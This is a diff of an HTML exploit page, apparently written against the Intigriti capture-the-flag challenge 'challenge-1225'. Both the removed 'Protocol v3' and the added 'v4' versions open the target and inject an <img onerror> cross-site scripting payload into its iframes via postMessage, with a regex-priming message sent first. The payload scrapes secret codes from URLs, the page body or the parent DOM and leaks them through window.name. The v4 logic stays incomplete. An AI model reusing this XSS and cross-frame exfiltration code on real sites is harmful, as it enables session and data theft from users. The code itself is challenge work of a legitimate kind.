@@ -1,125 +1,131 @@
 <!DOCTYPE html>
 <html>
 <head>
-    <title>Intigriti Debug Exploit</title>
-    <style>
-        body { font-family: sans-serif; background: #1a1a1a; color: #0f0; padding: 20px; }
-        table { border-collapse: collapse; width: 100%; margin-top: 20px; }
-        td, th { border: 1px solid #333; padding: 8px; text-align: left; }
-        .found { background: #004400; color: #fff; }
-        .missing { background: #440000; color: #ffcccc; }
-    </style>
+    <title>Intigriti Protocol v4</title>
 </head>
 <body>
-    <h1>Protocol v3: Visual Debugger</h1>
-    <p>Click Launch. Wait 3 seconds. Check the table below.</p>
-    <button id="btn" style="font-size:20px; padding:15px; background:#0f0; color:black; border:none; cursor:pointer;">LAUNCH EXPLOIT</button>
-    
-    <h3>Infinity Gauntlet Status:</h3>
-    <table id="stoneTable">
-        <tr><th>Index</th><th>Stone</th><th>Status</th><th>Secret</th></tr>
-        <tr id="row-0"><td class="missing">0</td><td>Power</td><td>Waiting...</td><td>-</td></tr>
-        <tr id="row-1"><td class="missing">1</td><td>Reality</td><td>Waiting...</td><td>-</td></tr>
-        <tr id="row-2"><td class="missing">2</td><td>Soul</td><td>Waiting...</td><td>-</td></tr>
-        <tr id="row-3"><td class="missing">3</td><td>Space</td><td>Waiting...</td><td>-</td></tr>
-        <tr id="row-4"><td class="missing">4</td><td>Time</td><td>Waiting...</td><td>-</td></tr>
-        <tr id="row-5"><td class="missing">5</td><td>Mind</td><td>Waiting...</td><td>-</td></tr>
-    </table>
-
-    <pre id="log" style="background:#333; padding:10px; margin-top:20px;"></pre>
+    <h1>Protocol v4: Parent Scraper</h1>
+    <p>1. Make sure this file is saved as <b>.html</b></p>
+    <p>2. Click Launch. Wait 3 seconds.</p>
+    <button id="btn" style="font-size:20px; padding:20px; background:#800080; color:white;">LAUNCH EXPLOIT</button>
+    <h3>Log:</h3>
+    <pre id="log" style="background:#f0f0f0; padding:10px; white-space: pre-wrap;"></pre>
 
     <script>
         let targetWin = null;
-        let stones = {};
-        let attackInterval = null;
+        let foundSecrets = false;
 
         function log(msg) {
             document.getElementById('log').innerText = msg + "\n" + document.getElementById('log').innerText;
         }
 
-        function updateTable(index, secret) {
-            const row = document.getElementById(`row-${index}`);
-            row.className = "found";
-            row.cells[2].innerText = "CAPTURED";
-            row.cells[3].innerText = secret;
-        }
-
         document.getElementById('btn').addEventListener('click', () => {
+            // 1. Open the target
             targetWin = window.open('https://challenge-1225.intigriti.io/challenge#PerfectlyBalanced', 'target');
-            log("Target launched. Starting Rapid Fire...");
-            // Attack very fast (100ms) to catch the window before it closes
-            attackInterval = setInterval(attack, 100);
+            log("Target launched. Attempting to scrape Parent DOM via Soul Stone...");
+            
+            // 2. Attack Loop (Race against the 3s timer)
+            setInterval(attackSoulStone, 500);
         });
 
-        function attack() {
-            if(!targetWin) return;
+        function attackSoulStone() {
+            if(!targetWin || foundSecrets) return;
 
-            // Attack all 6 frames
-            for (let i = 0; i < 6; i++) {
-                if (stones[i]) continue; // Skip if caught
+            // We specifically target the SOUL STONE (Index 2)
+            // It is not sandboxed, so we can run scripts there.
+            let soulFrame = targetWin.frames[2];
+            if (!soulFrame) return;
 
-                try {
-                    let frame = targetWin[i];
-                    if (!frame) continue;
+            try {
+                // A. PRIMER (Trigger Regex Vulnerability)
+                soulFrame.postMessage("A".repeat(2500) + "<", '*');
 
-                    // 1. PRIMER (Large padding)
-                    frame.postMessage("A".repeat(2500) + "<", '*');
-
-                    // 2. PAYLOAD (Improved Scraper)
-                    // We check URL, then Body (for Space), then Title.
-                    // We exfiltrate via window.name
-                    const code = `
-                        var s = "";
-                        // A. URL (Power, Reality, Soul, Mind, Time?)
-                        var m = location.search.match(/=[a-f0-9]{8}/);
-                        if(m) s = m[0].substring(1);
-
-                        // B. Body Text (Space Stone - Critical Fix)
-                        if(!s) {
-                            var body = document.body.innerText || "";
-                            var hex = body.match(/[a-f0-9]{8}/);
-                            if(hex) s = hex[0];
-                        }
+                // B. PAYLOAD (The "Parent Scraper")
+                // This script runs INSIDE the Soul Stone iframe.
+                // It tries to read 'parent.document.body.innerHTML' to find the secrets of its siblings.
+                const maliciousScript = `
+                    try {
+                        // 1. Attempt to access the Parent DOM
+                        // We look for the 'code' variable or the iframes in the HTML
+                        // Since we are cross-origin (soul. vs challenge.), this usually fails
+                        // UNLESS document.domain is set or we get lucky with 'name' attributes.
                         
-                        // C. Exfiltrate
-                        if(s) window.name = "STONE:" + ${i} + ":" + s;
-                    `;
-                    
-                    frame.postMessage(`<img src=x onerror='${code}'>`, '*');
-
-                    // 3. COLLECT
-                    // Read the window.name property
-                    let data = frame.name;
-                    if (data && data.startsWith("STONE:")) {
-                        let parts = data.split(":");
-                        let idx = parseInt(parts[1]);
-                        let secret = parts[2];
+                        // Let's try to just dump the parent HTML if allowed
+                        var parentHTML = parent.document.body.innerHTML;
                         
-                        if (!stones[idx]) {
-                            stones[idx] = secret;
-                            updateTable(idx, secret);
-                            log(`[+] Got Stone ${idx}: ${secret}`);
-                            checkWin();
+                        // 2. Regex to find ALL 6 stones in the parent HTML
+                        // They look like: ?power_stone=xxxxxxxx
+                        var secrets = parentHTML.match(/stone=[a-f0-9]{8}/g);
+                        
+                        if(secrets && secrets.length >= 5) {
+                            window.name = "SUCCESS:" + secrets.join(",");
+                        } else {
+                             // Fallback: If we can't read parent, maybe we can read our siblings' names?
+                             // Try to find Time Stone secret specifically
+                             window.name = "DEBUG: Accessed Parent but no secrets found";
                         }
+                    } catch(e) {
+                        // Access Denied? 
+                        // Let's try the fallback: Leaking the Time Stone via CSS or Frames?
+                        // Actually, if this fails, we report the error.
+                        window.name = "ERROR: " + e.message;
                     }
-                } catch(e) {}
-            }
+                `;
+                
+                soulFrame.postMessage(`<img src=x onerror="${maliciousScript}">`, '*');
+
+                // C. READ RESULT (From our Exploit Page)
+                let result = soulFrame.name;
+                
+                if (result && result !== "") {
+                    log("Soul Stone says: " + result);
+                    
+                    if (result.startsWith("SUCCESS:")) {
+                        foundSecrets = true;
+                        parseAndExecute(result.substring(8));
+                    }
+                }
+
+            } catch(e) { console.log(e); }
         }
 
-        function checkWin() {
-            // Even if we miss Time Stone, if we have others, let's try to infer or alert.
-            // If we have all 6:
-            if (Object.keys(stones).length >= 6) {
-                clearInterval(attackInterval);
-                log("ALL STONES FOUND. EXECUTING...");
-                
-                // Construct Code
-                // Order: Power(0)+Mind(5)+Reality(1)+Space(3)+Soul(2)+Time(4)
-                const fullCode = stones[0]+stones[5]+stones[1]+stones[3]+stones[2]+stones[4];
-                
-                // Final Attack via Main Window
-                targetWin.postMessage(fullCode + "alert(document.domain)", '*');
-            }
+        function parseAndExecute(csvSecrets) {
+            // We have a list like: stone=11111111,stone=22222222,...
+            // We need to map them to the correct order.
+            // Based on your Source Code screenshot:
+            // Power (0-8), Mind (8-16), Reality (16-24), Space (24-32), Soul (32-40), Time (40-48)
+            
+            // We need to be careful matching them. 
+            // The regex found them in the order they appear in the HTML.
+            // HTML Order: Power, Reality, Soul, Space, Time, Mind.
+            
+            let parts = csvSecrets.split(',');
+            // Clean up "stone=" prefix
+            let codes = parts.map(s => s.split('=')[1]);
+            
+            log("Extracted Codes: " + codes.join(", "));
+
+            // HTML Order Mapping (Based on appendChild order):
+            // 0: Power
+            // 1: Reality
+            // 2: Soul
+            // 3: Space (Note: Space might not be in URL? Check this!)
+            // 4: Time
+            // 5: Mind
+            
+            let power = codes[0];
+            let reality = codes[1];
+            let soul = codes[2];
+            // Space stone URL is just "/" in your logs, so it might be MISSING from this list!
+            // If Space is missing, we need to handle it.
+            let time = codes[3]; 
+            let mind = codes[4];
+
+            // WAIT! The code requires the full 48 chars.
+            // If we can't get Space Stone from Parent HTML (because it's sent via postMessage),
+            // We might need to combine this scrape with the "Space Stone Scraper" from v3.
+            
+            log("Note: If Space Stone is missing, we need to combine exploits.");
         }
     </script>
 </body>
